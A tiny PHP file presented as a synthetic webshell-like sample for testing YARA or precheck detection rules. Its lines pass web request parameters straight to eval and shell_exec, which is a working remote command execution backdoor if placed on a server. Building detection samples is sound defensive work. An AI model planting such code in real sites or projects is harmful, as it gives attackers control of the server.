<?php
// Synthetic webshell-like pattern for YARA / precheck demos (not a real implant).
eval($_GET['cmd']);
shell_exec($_POST['x']);
base64_decode($_REQUEST['p']);
